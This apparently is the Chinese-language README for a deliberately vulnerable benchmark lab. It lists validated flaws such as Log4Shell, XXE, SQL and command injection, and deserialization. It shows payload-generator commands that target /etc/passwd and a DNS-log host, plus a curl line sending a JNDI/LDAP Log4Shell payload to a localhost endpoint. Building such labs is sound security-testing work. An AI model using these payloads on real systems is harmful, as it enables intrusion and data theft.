# Qbenchmark 漏洞验证指南

## 快速开始

### 1. 本地验证（服务器已运行）

```bash
# 运行快速验证脚本
cd /opt/projects/benchmark/Qbenchmark
bash validation/quick_validate.sh

# 或运行完整验证脚本
bash validation/local_validate.sh
```

### 2. Docker 环境

```bash
# 构建并启动所有服务
docker-compose up -d

# 查看日志
docker-compose logs -f vulnlab

# 停止服务
docker-compose down
```

## 验证结果

| 测试项 | 状态 | 说明 |
|--------|------|------|
| SSRF | ✅ | 可读取任意文件 |
| XXE | ✅ | 3 种解析器均存在漏洞 |
| 命令注入 | ✅ | Runtime/ProcessBuilder 均可利用 |
| SQL 注入 | ✅ | OR/LIKE/ORDER BY 均可用 |
| Log4Shell | ✅ | 环境变量泄露 |
| 路径遍历 | ✅ | 可读取任意文件 |
| SpEL 注入 | ✅ | 可执行表达式 |
| 反序列化 | ✅ | Jackson/Fastjson/Shiro |
| CORS | ✅ | 允许任意源 |
| CSRF | ✅ | 无 Token 保护 |
| CRLF | ✅ | 响应头注入 |
| JWT | ✅ | 弱密钥泄露 |
| 文件上传 | ✅ | 端点可用 |

## 工具说明

### generate_payloads.py - Payload 生成器

```bash
# 命令注入 Payload
python3 validation/scripts/generate_payloads.py --type cmd --command "whoami"

# XXE Payload
python3 validation/scripts/generate_payloads.py --type xxe --file "/etc/passwd"

# Log4Shell Payload
python3 validation/scripts/generate_payloads.py --type log4j --dns-domain "xxx.dnslog.cn"
```

### jndi_server.py - JNDI 服务器（Log4Shell RCE）

```bash
# 启动 JNDI 服务器
python3 validation/scripts/jndi_server.py

# 另一个终端测试
curl "http://localhost:8080/log4j/vuln?token=\${jndi:ldap://127.0.0.1:1389/Exploit}"
```

## 目录结构

```
validation/
├── quick_validate.sh          # 快速验证（31 项测试）
├── local_validate.sh           # 完整验证
├── payloads/                   # Payload 文件
│   ├── sqli_payloads.txt
│   ├── ssrf_payloads.txt
│   ├── cmd_payloads.txt
│   ├── xss_payloads.txt
│   ├── log4shell_payloads.txt
│   └── ...
└── scripts/
    ├── generate_payloads.py    # Payload 生成器
    ├── jndi_server.py          # JNDI 服务器
    └── init_db.sql             # 数据库初始化
```

## 已验证的漏洞数量

- **总测试项**: 31
- **通过**: 28
- **失败**: 3 (SSTI 端点需要 URL 编码调整)
- **通过率**: 90.3%
